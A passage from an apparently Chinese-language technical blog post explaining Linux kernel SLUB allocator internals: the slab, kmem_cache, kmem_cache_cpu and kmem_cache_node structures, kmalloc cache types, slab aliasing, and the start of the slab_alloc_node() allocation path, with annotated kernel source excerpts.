CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">int</span> slabs;<span class="hljs-comment">/* 剩余的 slabs 数量 */</span><br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><span class="hljs-comment">/* Double-word boundary */</span><br><span class="hljs-type">void</span> *freelist;<span class="hljs-comment">/* 第一个空闲对象 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br><span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br><span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>&#125;;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu_head</span>;</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __unused;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">atomic_t</span> __page_refcount;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> memcg_data;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>slab_cache</code> ：该 slab 对应的内存池</li><li><code>freelist</code> ：<strong>Slab 上的空闲对象组织为一个 NULL 结尾的单向链表</strong>，该指针指向第一个空闲对象，耗尽时为 NULL</li><li><code>slab_list</code> ：按用途连接多个 slabs 的双向链表</li><li><code>inuse</code> ：已被使用的对象数量</li><li><code>objects</code>：该 slab 上的对象总数</li><li><code>frozen</code>：是否被冻结，即<strong>已经归属于特定的 CPU</strong></li></ul><blockquote><p>这里我们需要注意的是 <strong>counters 成员直接涵盖了 inuse &amp; objects &amp; frozen</strong>，后面会有大量的直接通过 counters 成员进行赋值的操作，<strong>实际上就是赋值了 inuse &amp; objects &amp; frozen</strong></p></blockquote><p>正如一个 page 结构体直接对应一张内存页（或复合页），复用了 page 结构体的 slab 也<strong>直接对应一份 slab 内存页</strong>，借助 <code>page_to_pfn()</code> 等函数可以直接完成 slab 结构体到对应内存页虚拟地址的转换，反之亦然，即<strong>我们可以直接通过一个空闲对象的虚拟地址找到对应的 slab 结构体</strong></p><p><img src="https://s2.loli.net/2023/02/21/cBXCGF4Z18VLMzl.png" alt="image.png"></p><h2 id="二、kmem-cache：特定大小-amp-用途对象（堆块）的内存池"><a href="#二、kmem-cache：特定大小-amp-用途对象（堆块）的内存池" class="headerlink" title="二、kmem_cache：特定大小&amp;用途对象（堆块）的内存池"></a>二、kmem_cache：特定大小&amp;用途对象（堆块）的内存池</h2><p><code>kmem_cache</code> 为一个基本的 allocator 组件，可以理解为 <strong>用于分配某个特定大小（某种特定用途）的对象的内存池</strong>，所有的 kmem_cache 构成一个双向链表，并存在一个对应的通用 <code>kmem_cache</code> 数组 <code>kmalloc_caches</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *</span><br><span class="hljs-class"><span class="hljs-title">kmalloc_caches</span>[<span class="hljs-title">NR_KMALLOC_TYPES</span>][<span class="hljs-title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="hljs-title">ro_after_init</span> =</span><br>&#123; <span class="hljs-comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;<br>EXPORT_SYMBOL(kmalloc_caches);<br></code></pre></td></tr></table></figure><blockquote><p>老版本还有个 dma 专用数组 <code>kmalloc_dma_caches</code> ，在 <a href="https://patchwork.kernel.org/project/linux-mm/patch/20180718133620.6205-2-vbabka@suse.cz/">这个 commit</a> 给合并起来了</p></blockquote><h3 id="I-基本结构"><a href="#I-基本结构" class="headerlink" title="I. 基本结构"></a>I. 基本结构</h3><p>该结构体定义于 <code>include/linux/slub_def.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab 缓存管理.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLUB_TINY</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">cpu_slab</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* 用于取回 partial slabs 等. */</span><br><span class="hljs-type">slab_flags_t</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> min_partial;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<span class="hljs-comment">/* 一个对象包含元数据的大小 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> object_size;<span class="hljs-comment">/* 一个对象不包含元数据的大小 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reciprocal_value</span> <span class="hljs-title">reciprocal_size</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<span class="hljs-comment">/* 空闲指针的偏移 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-comment">/* 要保留的 per cpu partial 对象数量 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial;<br><span class="hljs-comment">/* 要保留的 per cpu partial slub 数量 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial_slabs;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span>;</span><br><br><span class="hljs-comment">/* 分配与释放 slabs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">min</span>;</span><br><span class="hljs-type">gfp_t</span> allocflags;<span class="hljs-comment">/* （译注：向 buddy system）分配时所用的 gfp 标志位 */</span><br><span class="hljs-type">int</span> refcount;<span class="hljs-comment">/* 用于 slab 缓存销毁的引用计数 */</span><br><span class="hljs-type">void</span> (*ctor)(<span class="hljs-type">void</span> *);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inuse;<span class="hljs-comment">/* 元数据的偏移 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> align;<span class="hljs-comment">/* 对齐 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> red_left_pad;<span class="hljs-comment">/* Left redzone padding size */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<span class="hljs-comment">/* Name (only for display!) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><span class="hljs-comment">/* slab 缓存链表 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SYSFS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><span class="hljs-comment">/* For sysfs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> random;<span class="hljs-comment">// 用于加密 freelist 指针的随机值</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NUMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过从一个 remote node 分配以去碎片化.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> remote_node_defrag_ratio;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *random_seq;<span class="hljs-comment">// 用于在初始化时随机化 freelist</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KASAN</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kasan_cache</span> <span class="hljs-title">kasan_info</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> useroffset;<span class="hljs-comment">/* 用户拷贝区域的偏移 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> usersize;<span class="hljs-comment">/* 用户拷贝区域的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>cpu_slab</code>： <em>percpu 变量</em> ，指向一个 <code>kmem_cache_cpu</code> 结构体，即<strong>当前 CPU 独占的内存池</strong></p></li><li><p><code>flags</code>：标志位</p></li><li><p><code>min_partial</code>：node partial 链表上 slab 的<strong>最大数量</strong>（👴也不知道为什么要叫min，但实际判定发挥的是max的作用）</p></li><li><p><code>cpu_partial_slabs</code>：cpu partial 链表上  slab 的<strong>最大数量</strong></p></li><li><p><code>cpu_partial</code>：per cpu partial list 中最多的对象数量（但好象是没啥用）</p></li><li><p><code>size</code>：一个对象的实际大小</p></li><li><p><code>object_size</code>：一个对象所用数据的大小</p><blockquote><p>例如 <code>struct cred</code> 大小为 176（object_size），实际分配的对象大小为 192 （size）</p></blockquote></li><li><p><code>offset</code>：slab 上空闲对象链表指针在对象上的偏移</p></li><li><p><code>oo</code> ： <em>其实就是一个 int</em> </p><ul><li>低 16 位：一张 slab 上的对象数量</li><li>高 16 位：一张 slab 的大小（2<sup>n</sup> 张内存页）</li></ul></li><li><p><code>min</code>：一张 slab 上最少的对象数量</p></li><li><p><code>allocflags</code>：向 buddy system 请求页面时所用的 gfp flag</p></li><li><p><code>ctor</code>：对象的构造函数，在分配对象后会调用该函数进行初始化</p></li><li><p><code>inuse</code>：实际上就是 <code>object_size</code></p></li><li><p><code>align</code>：对象对齐的宽度</p></li><li><p>Randomed freelist 保护相关：</p><ul><li><code>random_seq</code> ：用于在 slab 初始化时随机化 freelist 上空闲对象的连接顺序</li></ul></li><li><p>Hardened Usercopy 保护相关</p><ul><li><code>useroffset</code>：用户空间能读写区域的起始偏移</li><li><code>usersize</code>：用户空间能读写区域的大小</li></ul></li><li><p><code>node</code>：一个 <code>kmem_cache_node</code> 数组，对应多个<strong>不同 node 的后备内存池</strong></p></li></ul><p><img src="https://s2.loli.net/2023/02/21/D4idvgzLAaqIBQM.png" alt="image.png"></p><h3 id="II-类型"><a href="#II-类型" class="headerlink" title="II. 类型"></a>II. 类型</h3><p>初始时一共有如下几种类型的 <code>kmem_cache</code>，在进行内存分配时若未指定内存池则会根据对应的 flag 从不同的 <code>kmem_cache</code> 中取：</p><ul><li><code>KMALLOC_NORMAL</code> ：通用类型内存池，对应 <code>kmalloc-*</code>，对应分配 flag 为 <code>GFP_KERNEL</code></li><li><code>KMALLOC_DMA</code>：用于 DMA 的内存池，对应 <code>kmalloc-dma-*</code></li><li><code>KMALLOC_RECLAIM</code> 可以被回收的内存池，对应 <code>kmalloc-rcl-*</code></li><li><code>KMALLOC_CGROUP</code> ：用于需要进行数量统计（<code>accounted</code>，主要用于 CGROUP 相关）的内存池，对应 <code>kmalloc-cg-*</code> ，对应分配 flag 为 <code>GFP_KERNEL_ACCOUNT</code></li></ul><p>若是未开启对应的编译选项，则默认合并入 <code>KMALLOC_NORMAL</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Whenever changing this, take care of that kmalloc_type() and</span><br><span class="hljs-comment"> * create_kmalloc_caches() still work as intended.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * KMALLOC_NORMAL can contain only unaccounted objects whereas KMALLOC_CGROUP</span><br><span class="hljs-comment"> * is for accounted but unreclaimable and non-dma objects. All the other</span><br><span class="hljs-comment"> * kmem caches can have both accounted and unaccounted objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">kmalloc_cache_type</span> &#123;</span><br>KMALLOC_NORMAL = <span class="hljs-number">0</span>,<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_TINY</span><br>KMALLOC_RECLAIM = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>KMALLOC_RECLAIM,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>NR_KMALLOC_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="III-slab-alias（mergeability）"><a href="#III-slab-alias（mergeability）" class="headerlink" title="III. slab alias（mergeability）"></a>III. slab alias（mergeability）</h3><p>slab alias 机制是一种对同等&#x2F;相近大小 object 的 <code>kmem_cache</code> 进行<strong>复用</strong>的一种机制：</p><ul><li>当一个 <code>kmem_cache</code> 在创建时，若已经存在能分配相等&#x2F;近似大小的 object 的 <code>kmem_cache</code> ，则<strong>不会创建新的 kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache 返回</strong></li></ul><blockquote><p>举个🌰，<code>cred_jar</code> 是专门用以分配 <code>cred</code> 结构体的 <code>kmem_cache</code>，在 Linux 4.4 之前的版本中，其为 <code>kmalloc-192</code> 的 alias，即 cred 结构体与其他的 192 大小的 object 都会从同一个 <code>kmem_cache</code>——<code>kmalloc-192</code> 中分配</p></blockquote><p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 这一 flag 的 <code>kmem_cache</code> 而言，则会新建一个新的 <code>kmem_cache</code> 而非为原有的建立 alias，🌰如在新版的内核当中 <code>cred_jar</code> 与 <code>kmalloc-192</code> 便是两个独立的 <code>kmem_cache</code>，<strong>彼此之间互不干扰</strong></p><h2 id="三、kmem-cache-cpu：各-CPU-独占内存池"><a href="#三、kmem-cache-cpu：各-CPU-独占内存池" class="headerlink" title="三、kmem_cache_cpu：各 CPU 独占内存池"></a>三、kmem_cache_cpu：各 CPU 独占内存池</h2><p>当进程向 slab allocator 请求内存分配时，首先会尝试从当前 CPU 的独占内存池进行分配 ——<code>kmem_cache_cpu</code> 结构体表示<strong>每个 CPU 独占的内存池</strong>，其在 <code>kmem_cache</code> 中为一个 percpu 变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When changing the layout, make sure freelist and tid are still compatible</span><br><span class="hljs-comment"> * with this_cpu_cmpxchg_double() alignment requirements.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> &#123;</span><br><span class="hljs-type">void</span> **freelist;<span class="hljs-comment">/* 指向下一个可用对象的指针 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<span class="hljs-comment">/* Globally unique transaction id */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><span class="hljs-comment">/* 用以内存分配的 slab */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">partial</span>;</span><span class="hljs-comment">/* Partially allocated frozen slabs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">local_lock_t</span> lock;<span class="hljs-comment">/* Protects the fields above */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_STATS</span><br><span class="hljs-type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>freelist</code>：指向下一个空闲对象的指针</li><li><code>slab</code>：当前用以进行内存分配的 slab</li><li><code>partial</code>：percpu partial slab 链表，链表上为仍有一定空闲对象的 slab</li></ul><p>slab 的 freelist 仅当其在 partial 链表上时有用，当一张 slab 为当前 CPU 正在使用的 slab 时，其 freelist 为 NULL，由 <code>kmem_cache_cpu.freelist</code> 指向第一个空闲对象</p><p><img src="https://s2.loli.net/2023/02/21/xSLqghNZ23nCMiz.png" alt="image.png"></p><h2 id="四、kmem-cache-node：各-node-后备内存池"><a href="#四、kmem-cache-node：各-node-后备内存池" class="headerlink" title="四、kmem_cache_node：各 node 后备内存池"></a>四、kmem_cache_node：各 node 后备内存池</h2><p><strong>每个 <a href="https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#0x03-struct-pglist-data%EF%BC%9A%E8%8A%82%E7%82%B9">node</a> 对应的后备内存池</strong>，当 percpu 的独占内存池耗尽后便会从对应 node 的后备内存池尝试分配</p><blockquote><p>不过大部分计算机都仅有一个 node，所以通常情况下每个 <code>kmem_cache</code> 也就只有一个 <code>kmem_cache_node</code>  😄</p></blockquote><p>因为本文主要讲 slub，所以仅截取 slub 相关字段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The slab lists for all objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB</span><br><span class="hljs-type">spinlock_t</span> list_lock;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_partial;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">partial</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span><br><span class="hljs-type">atomic_long_t</span> nr_slabs;<br><span class="hljs-type">atomic_long_t</span> total_objects;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">full</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>list_lock</code>：保护 partial 和 full 链表的锁</li><li><code>partial</code>：partial slab 链表，连接<strong>有着部分空闲对象剩余的 slab</strong></li><li><code>nr_partial</code>：partial slab 的数量</li><li><code>full</code>：full slab 链表，连接<strong>空闲对象完全耗尽的 slab</strong>（注：该链表基本上不常用）</li><li><code>nr_slabs</code>：总的 slab 数量</li><li><code>total_objects</code>：总的对象数量</li></ul><p><img src="https://s2.loli.net/2023/02/21/ECDOVtxAyiwd1UZ.png" alt="image.png"></p><h1 id="0x02-对象的分配"><a href="#0x02-对象的分配" class="headerlink" title="0x02. 对象的分配"></a>0x02. 对象的分配</h1><h2 id="※-一、slab-alloc-node-：从指定的-kmem-cache-分配-object"><a href="#※-一、slab-alloc-node-：从指定的-kmem-cache-分配-object" class="headerlink" title="※ 一、slab_alloc_node()：从指定的 kmem_cache 分配 object"></a>※ 一、slab_alloc_node()：从指定的 kmem_cache 分配 object</h2><p>在 slab allocator 中存在着多个不同的内存分配接口，其最后都会调用到 <code>slab_alloc_node()</code> 完成内存分配的工作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 内联化的快速路径以让分配函数 (kmalloc, kmem_cache_alloc) 中包含快速路径.</span><br><span class="hljs-comment"> * 因此，对于快速路径可以满足的请求，没有函数调用的开销.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 快速路径首先检查无锁的空闲链表是否可以被使用.</span><br><span class="hljs-comment"> * 若否，调用 __slab_alloc 进行缓慢处理.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 否则我们可以简单地从无锁空闲链表取出下一个对象.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> *<span class="hljs-title function_">slab_alloc_node</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> list_lru *lru,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> init = <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><p>该函数首先会调用 <code>slab_pre_alloc_hook()</code> 进行分配前的检查工作，不通过则返回 NULL，这一步主要是检查分配标志位是否合法等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">s = slab_pre_alloc_hook(s, lru, &amp;objcg, <span class="hljs-number">1</span>, gfpflags);<br><span class="hljs-keyword">if</span> (!s)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>接下来调用 <code>kfence_alloc()</code> 进行内存错误检测，不通过则直接跳转到 <code>out</code>，这里用到了 <em>Kfence (Kernel Electric Fence)</em>  内存纠错机制，主要是检查对 <code>data page</code> 的访问是否越界：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">object = kfence_alloc(s, orig_size, gfpflags);<br><span class="hljs-keyword">if</span> (unlikely(object))<br><span class="hljs-keyword">goto</span> out;<br></code></pre></td></tr></table></figure><p><strong>接下来调用 <code>__slab_alloc_node()</code> 进行正式的内存分配，这一步便是真正的核心分配函数</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">object = __slab_alloc_node(s, gfpflags, node, addr, orig_size);<br></code></pre></td></tr></table></figure><p>最后调用 <code>maybe_wipe_obj_freeptr()</code> 将 object 原本存放 next free object 指针的位置清零，之后调用 <code>slab_want_init_on_alloc()</code> 检查标志位是否有 <code>__GFP_ZERO</code>，若有则调用 <code>slab_post_alloc_hook()</code> 将 object 上数据清零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">maybe_wipe_obj_freeptr(s, object);<br>init = slab_want_init_on_alloc(gfpflags, s);<br><br>out:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当 init == &#x27;true&#x27;, 类似 kzalloc() 族, </span><br><span class="hljs-comment"> * 仅有 @orig_size 字节会被清零，而非 s-&gt;object_size</span><br><span class="hljs-comment"> */</span><br>slab_post_alloc_hook(s, objcg, gfpflags, <span class="hljs-number">1</span>, &amp;object, init, orig_size);<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们来看真正的核心分配函数 <code>__slab_alloc_node()</code></p><h3 id="I-slab-alloc-node-：从-percpu-freelist-进行分配（fast-path）"><a href="#I-slab-alloc-node-：从-percpu-freelist-进行分配（fast-path）" class="headerlink" title="I. __slab_alloc_node()：从 percpu freelist 进行分配（fast path）"></a>I. __slab_alloc_node()：从 percpu freelist 进行分配（fast path）</h3><p>该函数首先会先获取 percpu 的 <code>kmem_cache_cpu</code> 上的 freelist 与 slab，<strong>若 slab 或 freelist 为空</strong> &#x2F; slab 与 node 不匹配，则调用 <code>__slab_alloc()</code> 分配一张新 slab 并从其中获取一个空闲对象：</p><figure class="highlight c"><table><tr><td 